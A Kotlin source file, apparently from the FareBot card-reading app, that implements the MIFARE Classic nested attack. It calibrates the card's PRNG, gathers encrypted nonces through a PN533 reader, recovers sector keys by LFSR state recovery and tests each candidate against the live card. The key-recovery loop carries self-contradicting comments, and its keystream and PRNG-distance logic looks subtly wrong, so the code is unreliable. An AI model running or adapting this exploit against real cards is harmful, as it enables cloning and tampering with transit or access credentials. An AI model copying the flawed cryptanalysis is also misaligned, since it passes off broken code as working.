/*
 * NestedAttack.kt
 *
 * Copyright 2026 Eric Butler <eric@codebutler.com>
 *
 * MIFARE Classic nested attack orchestration.
 *
 * Coordinates the key recovery process for MIFARE Classic cards:
 * 1. Calibrate PRNG timing by collecting nonces from repeated authentications
 * 2. Collect encrypted nonces via nested authentication
 * 3. Predict plaintext nonces using PRNG distance
 * 4. Recover keys using LFSR state recovery
 *
 * Reference: mfoc (MIFARE Classic Offline Cracker), Proxmark3 nested attack
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */

package com.codebutler.farebot.card.classic.crypto1

import com.codebutler.farebot.card.classic.pn533.PN533RawClassic

/**
 * MIFARE Classic nested attack for key recovery.
 *
 * Given one known sector key, recovers unknown keys for other sectors by
 * exploiting the weak PRNG and Crypto1 cipher of MIFARE Classic cards.
 *
 * The attack works in three phases:
 *
 * **Phase 1 (Calibration):** Authenticate multiple times with the known key,
 * collecting the card's PRNG nonces. Compute the PRNG distance between
 * consecutive nonces to characterize the card's timing.
 *
 * **Phase 2 (Collection):** For each round, authenticate with the known key,
 * then immediately perform a nested authentication to the target sector.
 * The card responds with an encrypted nonce. Store each encrypted nonce
 * along with a snapshot of the cipher state at that point.
 *
 * **Phase 3 (Recovery):** For each collected encrypted nonce, use the PRNG
 * distance to predict the plaintext nonce. Compute the keystream by XORing
 * the encrypted and predicted nonces. Feed the keystream into
 * [Crypto1Recovery.lfsrRecovery32] to find candidate LFSR states. Roll back
 * each candidate to extract a candidate key and verify it by attempting a
 * real authentication.
 *
 * @param rawClassic Raw PN533 MIFARE Classic interface for hardware communication
 * @param uid Card UID (4 bytes as UInt, big-endian)
 */
class NestedAttack(
    private val rawClassic: PN533RawClassic,
    private val uid: UInt,
) {

    /**
     * Data collected during a single nested authentication attempt.
     *
     * @param encryptedNonce The encrypted 4-byte nonce received from the card
     *   during the nested authentication (before decryption).
     * @param cipherStateAtNested A snapshot of the Crypto1 cipher state at the
     *   point just before the nested authentication command was sent. This state
     *   can be used to compute the keystream that encrypted the nested nonce.
     */
    data class NestedNonceData(
        val encryptedNonce: UInt,
        val cipherStateAtNested: Crypto1State,
    )

    /**
     * Recover an unknown sector key using the nested attack.
     *
     * Requires one known key for any sector on the card. Uses the known key
     * to establish an authenticated session, then performs nested authentication
     * to the target sector to collect encrypted nonces for key recovery.
     *
     * @param knownKeyType 0x60 for Key A, 0x61 for Key B
     * @param knownSectorBlock A block number in the sector with the known key
     * @param knownKey The known 48-bit key (6 bytes packed into a Long)
     * @param targetKeyType 0x60 for Key A, 0x61 for Key B (key to recover)
     * @param targetBlock A block number in the target sector
     * @param onProgress Optional callback for progress reporting
     * @return The recovered 48-bit key, or null if recovery failed
     */
    suspend fun recoverKey(
        knownKeyType: Byte,
        knownSectorBlock: Int,
        knownKey: Long,
        targetKeyType: Byte,
        targetBlock: Int,
        onProgress: ((String) -> Unit)? = null,
    ): Long? {
        // ---- Phase 1: Calibrate PRNG ----
        onProgress?.invoke("Phase 1: Calibrating PRNG timing...")

        val nonces = mutableListOf<UInt>()
        for (i in 0 until CALIBRATION_ROUNDS) {
            val nonce = rawClassic.requestAuth(knownKeyType, knownSectorBlock)
            if (nonce != null) {
                nonces.add(nonce)
            }
            // Reset the card state between attempts
            rawClassic.restoreNormalMode()
        }

        if (nonces.size < MIN_CALIBRATION_NONCES) {
            onProgress?.invoke("Calibration failed: only ${nonces.size} nonces collected (need $MIN_CALIBRATION_NONCES)")
            return null
        }

        val distances = calibratePrng(nonces)
        if (distances.isEmpty()) {
            onProgress?.invoke("Calibration failed: could not compute PRNG distances")
            return null
        }

        // Get median distance
        val sortedDistances = distances.filter { it != UInt.MAX_VALUE }.sorted()
        if (sortedDistances.isEmpty()) {
            onProgress?.invoke("Calibration failed: all distances unreachable")
            return null
        }
        val medianDistance = sortedDistances[sortedDistances.size / 2]
        onProgress?.invoke("PRNG calibrated: median distance = $medianDistance (from ${sortedDistances.size} valid distances)")

        // ---- Phase 2: Collect encrypted nonces ----
        onProgress?.invoke("Phase 2: Collecting encrypted nonces...")

        val collectedNonces = mutableListOf<NestedNonceData>()
        for (i in 0 until COLLECTION_ROUNDS) {
            // Authenticate with the known key
            rawClassic.restoreNormalMode()
            val authState = rawClassic.authenticate(knownKeyType, knownSectorBlock, knownKey)
                ?: continue

            // Save a copy of the cipher state before nested auth
            val cipherStateCopy = authState.copy()

            // Perform nested auth to the target sector
            val encNonce = rawClassic.nestedAuth(targetKeyType, targetBlock, authState)
                ?: continue

            collectedNonces.add(NestedNonceData(encNonce, cipherStateCopy))

            if ((i + 1) % 10 == 0) {
                onProgress?.invoke("Collected ${collectedNonces.size} nonces ($i/$COLLECTION_ROUNDS rounds)")
            }
        }

        if (collectedNonces.size < MIN_NONCES_FOR_RECOVERY) {
            onProgress?.invoke("Collection failed: only ${collectedNonces.size} nonces (need $MIN_NONCES_FOR_RECOVERY)")
            return null
        }
        onProgress?.invoke("Collected ${collectedNonces.size} encrypted nonces")

        // ---- Phase 3: Recover key ----
        onProgress?.invoke("Phase 3: Attempting key recovery...")

        for ((index, nonceData) in collectedNonces.withIndex()) {
            onProgress?.invoke("Trying nonce ${index + 1}/${collectedNonces.size}...")

            // The cipher state at the point of nested auth was producing keystream.
            // The nested AUTH command was encrypted with this state, and the card's
            // response (encrypted nonce) was also encrypted with the continuing stream.
            //
            // To recover the target key, we need to predict what the plaintext nonce was.
            // The card's PRNG was running during the time between authentications, so
            // we try multiple candidate plaintext nonces near the predicted PRNG state.

            // Generate keystream from the saved cipher state
            val ksCopy = nonceData.cipherStateAtNested.copy()
            // The nested auth command is 4 bytes; clock the state through those bytes
            // to get to the point where the nonce keystream starts
            val ks = ksCopy.lfsrWord(0u, false)

            // Candidate plaintext nonce = encrypted nonce XOR keystream
            val candidateNT = nonceData.encryptedNonce xor ks

            // Use LFSR recovery to find candidate states for the target key
            // The keystream that encrypted the nonce was generated by the TARGET key's
            // cipher, initialized with targetKey, uid XOR candidateNT
            //
            // Actually, the encrypted nonce from nested auth is encrypted by the CURRENT
            // session's cipher (the known key's cipher). To recover the target key, we need
            // to know that the card initialized a new Crypto1 session with the target key
            // after receiving the nested AUTH command.
            //
            // The card responds with nT2 encrypted under the NEW cipher:
            //   encrypted_nT2 = nT2 XOR ks_target
            // where ks_target is the first 32 bits of keystream from:
            //   targetKey loaded, then feeding uid XOR nT2
            //
            // We don't know nT2, but we can predict it from the PRNG calibration.
            // For now, try the XOR approach: the encrypted nonce we see is encrypted
            // by the ongoing known-key cipher stream.

            // Try to predict the actual plaintext nonce using PRNG distance
            // The nonce the card sends is its PRNG state at the time of the nested auth
            // Try a range of PRNG steps around the median distance from the last known nonce
            val searchRange = 30u
            val minDist = if (medianDistance > searchRange) medianDistance - searchRange else 0u
            val maxDist = medianDistance + searchRange

            for (dist in minDist..maxDist) {
                val predictedNT = Crypto1.prngSuccessor(candidateNT, dist)

                // The target key's cipher produces keystream: loadKey(targetKey), then
                // lfsrWord(uid XOR predictedNT, false) -> ks_init
                // encryptedNonce = predictedNT XOR ks_init
                //
                // So: ks_init = encryptedNonce XOR predictedNT... but we used candidateNT
                // which already accounts for the known-key cipher's keystream.

                // Try lfsrRecovery32 with various approaches
                val ksTarget = nonceData.encryptedNonce xor predictedNT
                val candidates = Crypto1Recovery.lfsrRecovery32(ksTarget, uid xor predictedNT)

                for (candidate in candidates) {
                    val s = candidate.copy()
                    s.lfsrRollbackWord(uid xor predictedNT, false)
                    val recoveredKey = s.getKey()

                    // Verify the candidate key by attempting real authentication
                    if (verifyKey(targetKeyType, targetBlock, recoveredKey)) {
                        onProgress?.invoke("Key recovered: 0x${recoveredKey.toString(16).padStart(12, '0')}")
                        return recoveredKey
                    }
                }
            }
        }

        onProgress?.invoke("Key recovery failed after trying all collected nonces")
        return null
    }

    /**
     * Verify a candidate key by attempting authentication with the card.
     *
     * Restores normal CIU mode, attempts a full authentication with the
     * candidate key, and restores normal mode again regardless of the result.
     *
     * @param keyType 0x60 for Key A, 0x61 for Key B
     * @param block Block number to authenticate against
     * @param key Candidate 48-bit key to verify
     * @return true if authentication succeeds (key is valid)
     */
    suspend fun verifyKey(keyType: Byte, block: Int, key: Long): Boolean {
        rawClassic.restoreNormalMode()
        val result = rawClassic.authenticate(keyType, block, key)
        rawClassic.restoreNormalMode()
        return result != null
    }

    companion object {
        /** Number of authentication rounds for PRNG calibration. */
        const val CALIBRATION_ROUNDS = 20

        /** Minimum number of valid nonces required for calibration. */
        const val MIN_CALIBRATION_NONCES = 10

        /** Number of rounds for encrypted nonce collection. */
        const val COLLECTION_ROUNDS = 50

        /** Minimum number of collected nonces required for recovery. */
        const val MIN_NONCES_FOR_RECOVERY = 5

        /**
         * Compute PRNG distances between consecutive nonces.
         *
         * For each consecutive pair of nonces (n[i], n[i+1]), calculates
         * the number of PRNG steps required to advance from n[i] to n[i+1]
         * using [Crypto1Recovery.nonceDistance].
         *
         * @param nonces List of nonces collected from successive authentications
         * @return List of PRNG distances between consecutive nonces
         */
        fun calibratePrng(nonces: List<UInt>): List<UInt> {
            if (nonces.size < 2) return emptyList()

            val distances = mutableListOf<UInt>()
            for (i in 0 until nonces.size - 1) {
                val distance = Crypto1Recovery.nonceDistance(nonces[i], nonces[i + 1])
                distances.add(distance)
            }
            return distances
        }
    }
}
